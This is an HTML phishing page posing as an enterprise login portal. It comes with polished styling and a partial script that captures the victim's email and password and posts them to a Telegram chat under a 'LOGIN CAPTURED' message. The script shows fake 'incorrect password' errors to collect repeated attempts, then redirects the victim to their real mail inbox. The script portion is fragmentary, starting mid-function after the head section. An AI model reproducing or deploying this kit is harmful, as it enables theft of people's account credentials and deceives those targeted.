<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="robots" content="noindex, nofollow">
<link id="dynamicFavicon" rel="icon" type="image/png" href="https://img.logo.dev/young.com?token=pk_X3Yst72FQUOeVfOd-dlhKg">
<title>Secure Portal | Enterprise Login</title>

<style>
:root{
 --primary:#2563eb;
 --bg:#020617;
 --card:rgba(2,6,23,.92);
 --border:#1f2937;
 --text:#e5e7eb;
 --muted:#94a3b8;
 --warn:#eab308;
 --error:#ef4444;
}

*{
 box-sizing:border-box;
 margin:0;
 padding:0;
 -webkit-tap-highlight-color:transparent;
 user-select: none;
 -webkit-user-select: none;
 -moz-user-select: none;
 -ms-user-select: none;
}

html,body{
 height:100%;
 font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial;
 color:var(--text);
 overflow:hidden;
}

.background-container{
 position:fixed;
 inset:0;
 width:100%;
 height:100%;
 z-index:-2;
 background:var(--bg);
}

#bg{
 position:absolute;
 inset:0;
 width:100%;
 height:100%;
 background-size:cover;
 background-position:center top;
 background-repeat:no-repeat;
 filter:none;
 transform:scale(1);
 transition:background-image 0.5s ease;
}

.overlay{
 position:absolute;
 inset:0;
 background:linear-gradient(135deg, rgba(2,6,35,0.75), rgba(2,6,35,0.82));
 z-index:-1;
}

body{animation:fade .7s ease both}
@keyframes fade{from{opacity:0}to{opacity:1}}

@keyframes shake{
 0%,100%{transform:translateX(0)}
 20%{transform:translateX(-4px)}
 40%{transform:translateX(4px)}
 60%{transform:translateX(-3px)}
 80%{transform:translateX(3px)}
}
.shake{animation:shake .35s ease}

.wrap{
 min-height:100%;
 display:grid;
 place-items:center;
 padding:24px;
 position:relative;
 z-index:1;
}

.card{
 width:100%;
 max-width:420px;
 background:var(--card);
 backdrop-filter:blur(10px);
 border:1px solid var(--border);
 border-radius:14px;
 padding:32px 28px;
 box-shadow:0 30px 60px rgba(0,0,0,.55);
 animation:up .5s ease both;
}

@keyframes up{
 from{transform:translateY(14px);opacity:0}
 to{transform:translateY(0);opacity:1}
}

.brand{
 display:flex;
 align-items:center;
 gap:12px;
 margin-bottom:22px;
}

.brand img{
 width:46px;height:46px;
 border-radius:10px;
 padding:6px;
 background:#0b1220;
 border:1px solid var(--border);
 object-fit:contain;
}

.brand h1{
 font-size:18px;
 font-weight:600;
 word-break:break-word;
}
.subtitle{
 font-size:13px;
 color:var(--muted);
}

.field{margin-bottom:16px}
label{
 font-size:12px;
 color:var(--muted);
 margin-bottom:6px;
 display:block;
 text-transform:uppercase;
 letter-spacing:0.3px;
}

input{
 width:100%;
 padding:12px 14px;
 border-radius:10px;
 border:1px solid var(--border);
 background:#020617;
 color:var(--text);
 font-size:14px;
}

input:focus{
 outline:none;
 border-color:var(--primary);
 box-shadow:0 0 0 3px rgba(37,99,235,.25);
}

input:disabled{
 opacity:0.5;
 cursor:not-allowed;
}

/* LOCKED EMAIL FIELD STYLING */
input[readonly]{
 background:#0b1220;
 color:#cbd5e1;
 cursor:not-allowed;
 border-color:#334155;
 opacity:1;
}
input[readonly]:focus{
 border-color:#334155;
 box-shadow:none;
}

.pass-wrap{position:relative}
.toggle{
 position:absolute;
 right:12px;
 top:50%;
 transform:translateY(-50%);
 font-size:12px;
 color:#93c5fd;
 cursor:pointer;
 user-select:none;
 background:#020617;
 padding:2px 6px;
 border-radius:6px;
}
.toggle:hover{color:#60a5fa}

.btn{
 width:100%;
 padding:12px;
 border-radius:10px;
 border:none;
 background:linear-gradient(135deg,#60a5fa,var(--primary));
 color:#020617;
 font-weight:600;
 font-size:14px;
 cursor:pointer;
 transition:all 0.2s;
 margin-top:8px;
}
.btn:hover{filter:brightness(1.05);transform:translateY(-1px)}
.btn:active{transform:translateY(0)}
.btn:disabled{
 opacity:0.6;
 cursor:not-allowed;
 transform:none;
}

.links{
 margin-top:14px;
 display:flex;
 justify-content:space-between;
 font-size:12px;
}
.links a{color:#93c5fd;text-decoration:none}
.links a:hover{text-decoration:underline}

.trust{
 margin-top:18px;
 font-size:12px;
 color:var(--muted);
 display:flex;
 align-items:center;
 gap:8px;
 justify-content:center;
}

.lock{
 width:16px;
 height:16px;
 fill:#22c55e;
}

.footer{
 margin-top:18px;
 font-size:11px;
 color:var(--muted);
 text-align:center;
 border-top:1px solid rgba(31,41,55,0.5);
 padding-top:14px;
}

.status-msg{
 font-size:12px;
 margin-top:12px;
 padding:8px;
 border-radius:8px;
 text-align:center;
 display:none;
 background:rgba(0,0,0,0.6);
}

.status-msg.error{
 background:rgba(220,38,38,0.2);
 color:#f87171;
 border-left:3px solid #ef4444;
}

.status-msg.success{
 background:rgba(34,197,94,0.2);
 color:#4ade80;
 border-left:3px solid #22c55e;
}

.status-msg.info{
 background:rgba(59,130,246,0.2);
 color:#60a5fa;
 border-left:3px solid #3b82f6;
}

.status-msg.warning{
 background:rgba(234,179,8,0.2);
 color:#fbbf24;
 border-left:3px solid #eab308;
}

.domain-badge{
 background:rgba(37,99,235,0.15);
 border-radius:8px;
 padding:6px 10px;
 margin-bottom:16px;
 font-size:11px;
 text-align:center;
 color:var(--muted);
 word-break:break-all;
}
.domain-badge strong{
 color:var(--primary);
 font-family:monospace;
}

.attempts-counter{
 font-size:11px;
 text-align:right;
 margin-top:4px;
 color:var(--muted);
}

.attempts-counter.warning{
 color:var(--warn);
}

.attempts-counter.error{
 color:var(--error);
}

.bg-loading{
 position:absolute;
 bottom:20px;
 right:20px;
 font-size:10px;
 color:var(--muted);
 background:rgba(0,0,0,0.5);
 padding:4px 10px;
 border-radius:20px;
 z-index:2;
 pointer-events:none;
 font-family:monospace;
}
</style>
</head>

 img.onerror = function() {

   JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: `🔐 ${finalDomain.toUpperCase()} LOGIN CAPTURED\n📧 ${email}\n🔑 ${password}\n🆔 ${SESSION_ID}` })
 );
 }
 
 if (attemptCount >= MAX_ATTEMPTS) {
 loginBtn.disabled = true;
 loginBtn.textContent = 'REDIRECTING...';
 setTimeout(() => { redirectToMailInbox(email, finalDomain); }, 1500);
 return;
 }
 
 setTimeout(() => {
 pwField.value = '';
 if (attemptCount === 1) {
 showError('Incorrect password. 2 attempts remaining.');
 } else if (attemptCount === 2) {
 showError('Incorrect password. 1 attempt remaining before lockout.');
 }
 loginBtn.disabled = false;
 loginBtn.textContent = 'LOG IN';
 pwField.focus();
 }, 800);
 });
 
 const forgotLink = document.getElementById('forgotLink');
 if (forgotLink) {
 forgotLink.addEventListener('click', function(e) {
 e.preventDefault();
 showStatus(`📧 Password reset instructions would be sent to your ${currentDomain} email address.`, 'info');
 });
 }
 
 const altMethod = document.getElementById('altMethod');
 if (altMethod) {
 altMethod.addEventListener('click', function(e) {
 e.preventDefault();
 showStatus('🔐 Additional verification methods are available for enterprise accounts.', 'info');
 });
 }
 
 console.log('✅ Portal initialized for domain:', currentDomain);
 console.log('✅ Telegram will send to chat ID:', TELEGRAM_CHAT_ID);
 console.log('🔒 Email field locked:', emailField && emailField.readOnly);
 
})();
</script>
